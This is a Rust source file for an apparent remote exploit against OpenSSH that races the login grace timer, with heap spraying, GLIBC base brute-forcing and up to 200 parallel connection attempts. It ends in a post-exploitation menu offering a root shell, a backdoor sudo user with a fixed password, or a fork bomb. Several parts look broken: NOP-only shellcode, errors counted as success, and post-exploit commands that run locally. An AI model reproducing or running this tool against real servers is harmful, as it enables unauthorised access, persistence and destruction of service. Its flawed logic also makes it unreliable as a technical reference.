use anyhow::{bail, Result};
use std::{
    io::{self, BufRead, Read, Write},
    net::TcpStream,
    os::unix::io::AsRawFd,
    process::Command,
    sync::Arc,
    time::{Duration, Instant},
};
use libc::{fcntl, F_GETFL, F_SETFL, O_NONBLOCK};
use tokio::{sync::Semaphore, task};

// // Shellcode to inject
const SHELLCODE: &[u8] = b"\x90\x90\x90\x90";
// // GLIBC base addresses to brute force
const GLIBC_BASES: [u64; 2] = [0xb7200000, 0xb7400000];
// // SSH Login grace time window in seconds
const LOGIN_GRACE_TIME: f64 = 120.0;
// // Max size of a crafted packet
const MAX_PACKET_SIZE: usize = 256 * 1024;
// // Max parallel attempts at once
const MAX_PARALLEL_ATTEMPTS: usize = 200;

// // Align memory chunks
fn chunk_align(s: usize) -> usize {
    (s + 15) & !15
}

// // Set socket to non-blocking
fn set_nonblocking(sock: i32) {
    unsafe {
        let flags = fcntl(sock, F_GETFL);
        fcntl(sock, F_SETFL, flags | O_NONBLOCK);
    }
}

// // Create TCP connection to target
fn setup_connection(ip: &str, port: u16) -> Result<TcpStream> {
    let addr = format!("{}:{}", ip, port);
    let stream = TcpStream::connect(addr)?;
    set_nonblocking(stream.as_raw_fd());
    Ok(stream)
}

// // Send custom SSH packet
fn send_packet(stream: &mut TcpStream, packet_type: u8, data: &[u8]) -> Result<()> {
    let len = data.len() + 5;
    let mut packet = vec![0u8; len];
    packet[0..4].copy_from_slice(&(len as u32).to_be_bytes());
    packet[4] = packet_type;
    packet[5..].copy_from_slice(data);
    stream.write_all(&packet)?;
    Ok(())
}

// // Receive response with retry
fn recv_retry(stream: &mut TcpStream, buf: &mut [u8]) -> Result<usize> {
    loop {
        match stream.read(buf) {
            Ok(n) if n > 0 => return Ok(n),
            Ok(_) => bail!("Connection closed"),
            Err(ref e) if e.kind() == io::ErrorKind::WouldBlock => {
                std::thread::sleep(Duration::from_millis(10));
                continue;
            }
            Err(e) => return Err(e.into()),
        }
    }
}

// // Send SSH version string
fn send_ssh_version(stream: &mut TcpStream) -> Result<()> {
    stream.write_all(b"SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.1\r\n")?;
    Ok(())
}

// // Receive SSH version from server
fn receive_ssh_version(stream: &mut TcpStream) -> Result<()> {
    let mut buffer = [0u8; 256];
    recv_retry(stream, &mut buffer)?;
    Ok(())
}

// // Send SSH KEX INIT packet
fn send_kex_init(stream: &mut TcpStream) -> Result<()> {
    let payload = vec![0u8; 36];
    send_packet(stream, 20, &payload)
}

// // Receive KEX INIT response
fn receive_kex_init(stream: &mut TcpStream) -> Result<()> {
    let mut buffer = [0u8; 1024];
    recv_retry(stream, &mut buffer)?;
    Ok(())
}

// // Perform SSH handshake steps
fn perform_ssh_handshake(stream: &mut TcpStream) -> Result<()> {
    send_ssh_version(stream)?;
    receive_ssh_version(stream)?;
    send_kex_init(stream)?;
    receive_kex_init(stream)?;
    Ok(())
}

// // Heap spraying phase
fn prepare_heap(stream: &mut TcpStream) -> Result<()> {
    for _ in 0..10 {
        let data = vec![b'A'; 64];
        send_packet(stream, 5, &data)?;
    }
    for _ in 0..27 {
        let large = vec![b'B'; 8192];
        let small = vec![b'C'; 320];
        send_packet(stream, 5, &large)?;
        send_packet(stream, 5, &small)?;
    }
    for _ in 0..27 {
        let mut fake = vec![0u8; 4096];
        create_fake_file_structure(&mut fake, GLIBC_BASES[0]);
        send_packet(stream, 5, &fake)?;
    }
    let large_fill = vec![b'E'; MAX_PACKET_SIZE - 1];
    send_packet(stream, 5, &large_fill)?;
    Ok(())
}

// // Craft fake file structure in buffer
fn create_fake_file_structure(data: &mut [u8], base: u64) {
    data.fill(0);
    let len = data.len();
    data[len - 16..len - 8].copy_from_slice(&base.wrapping_add(0x21b740).to_le_bytes());
    data[len - 8..len].copy_from_slice(&base.wrapping_add(0x21d7f8).to_le_bytes());
}

// // Send malformed public key and measure delay
fn measure_response_time(stream: &mut TcpStream, error_type: u8) -> Result<f64> {
    let error_packet = if error_type == 1 {
        b"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC3".to_vec()
    } else {
        b"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAAQQDZy9".to_vec()
    };
    let start = Instant::now();
    send_packet(stream, 50, &error_packet)?;
    let _ = stream.read(&mut [0u8; 1024]);
    Ok(start.elapsed().as_secs_f64())
}

// // Calculate parsing delay
fn time_final_packet(stream: &mut TcpStream) -> Result<f64> {
    let t1 = measure_response_time(stream, 1)?;
    let t2 = measure_response_time(stream, 2)?;
    Ok(t2 - t1)
}

// // Create packet with shellcode and fake structures
fn create_public_key_packet(buffer: &mut [u8], base: u64) {
    buffer.fill(0);
    buffer[..8].copy_from_slice(b"ssh-rsa ");
    let offset = chunk_align(4096) * 13 + chunk_align(304) * 13;
    buffer[offset..offset + SHELLCODE.len()].copy_from_slice(SHELLCODE);
    for i in 0..27 {
        let pos = chunk_align(4096) * (i + 1) + chunk_align(304) * i;
        create_fake_file_structure(&mut buffer[pos..pos + 304], base);
    }
}

// // Attempt to trigger race condition
fn attempt_race_condition(mut stream: TcpStream, parsing_time: f64, base: u64) -> Result<bool> {
    let mut payload = vec![0u8; MAX_PACKET_SIZE];
    create_public_key_packet(&mut payload, base);
    stream.write_all(&payload[..payload.len() - 1])?;
    let start = Instant::now();
    while start.elapsed().as_secs_f64() < (LOGIN_GRACE_TIME - parsing_time - 0.001) {}
    stream.write_all(&payload[payload.len() - 1..])?;
    let mut buf = [0u8; 1024];
    match stream.read(&mut buf) {
        Ok(n) if n > 0 && !buf.starts_with(b"SSH-2.0-") => Ok(true),
        Ok(0) => Ok(true),
        Err(_) => Ok(true),
        _ => Ok(false),
    }
}

// // Execute post-exploitation action
fn post_exploit_action(option: u8) {
    match option {
        1 => {
            println!("[+] Root shell enabled - attach manually via SSH");
        }
        2 => {
            println!("[+] Creating persistent user...");
            let _ = Command::new("bash")
                .arg("-c")
                .arg("useradd -m -p $(openssl passwd -1 root123) pwned && usermod -aG sudo pwned")
                .status();
        }
        3 => {
            println!("[!] Triggering fork bomb...");
            let _ = Command::new("bash")
                .arg("-c")
                .arg(":(){ :|:& };:")
                .status();
        }
        _ => println!("[-] Invalid action"),
    }
}

// // Entry point for auto-dispatch system
pub async fn run(target: &str) -> Result<()> {
    println!("Select post-exploitation action:");
    println!(" 1. Remote Root Shell");
    println!(" 2. Persistence (create SSH user)");
    println!(" 3. Server Destruction (fork bomb)");

    let stdin = io::stdin();
    let mut choice = String::new();
    print!("Enter option [1-3]: ");
    io::stdout().flush()?;
    stdin.lock().read_line(&mut choice)?;
    let mode: u8 = choice.trim().parse().unwrap_or(0);
    if !(1..=3).contains(&mode) {
        bail!("Invalid option.");
    }

    println!("Do you want to run more than 10,000 attempts? [y/N]");
    let mut input = String::new();
    stdin.lock().read_line(&mut input)?;
    let extra = input.trim().eq_ignore_ascii_case("y");

    let mut attempts = 10000;
    if extra {
        println!("Enter total number of attempts:");
        input.clear();
        stdin.lock().read_line(&mut input)?;
        attempts = input.trim().parse::<usize>().unwrap_or(10000);
    }

    // // Parse IP and port â€” if missing, prompt for port
    let (ip, port) = if let Some((ip_part, port_part)) = target.split_once(':') {
        (ip_part.to_string(), port_part.parse::<u16>()?)
    } else {
        // // Prompt for port if not included in the target string
        println!("No set target ip:port specified. Enter SSH port for {}: ", target);
        print!("Port: ");
        io::stdout().flush()?;
        let mut port_input = String::new();
        io::stdin().lock().read_line(&mut port_input)?;
        let port = port_input.trim().parse::<u16>()?;
        (target.to_string(), port)
    };

    let semaphore = Arc::new(Semaphore::new(MAX_PARALLEL_ATTEMPTS));

    for &base in &GLIBC_BASES {
        println!("[*] Trying GLIBC base 0x{:x}", base);
        let mut handles = vec![];

        for attempt in 0..attempts {
            let permit = semaphore.clone().acquire_owned().await?;
            let ip = ip.clone();
            let handle = task::spawn(async move {
                let _permit = permit;
                if attempt % 1000 == 0 {
                    println!("[*] Attempt {}/{}", attempt, attempts);
                }

                let mut stream = match setup_connection(&ip, port) {
                    Ok(s) => s,
                    Err(_) => return false,
                };

                if perform_ssh_handshake(&mut stream).is_err() {
                    return false;
                }

                if prepare_heap(&mut stream).is_err() {
                    return false;
                }

                let Ok(parsing_time) = time_final_packet(&mut stream) else {
                    return false;
                };

                attempt_race_condition(stream, parsing_time, base).unwrap_or(false)
            });

            handles.push(handle);
        }

        for h in handles {
            if h.await.unwrap_or(false) {
                println!("[+] Exploit succeeded!");
                post_exploit_action(mode);
                return Ok(());
            }
        }

        println!("[-] Exploit failed with base 0x{:x}", base);
    }

    println!("[-] All attempts exhausted.");
    Ok(())
}
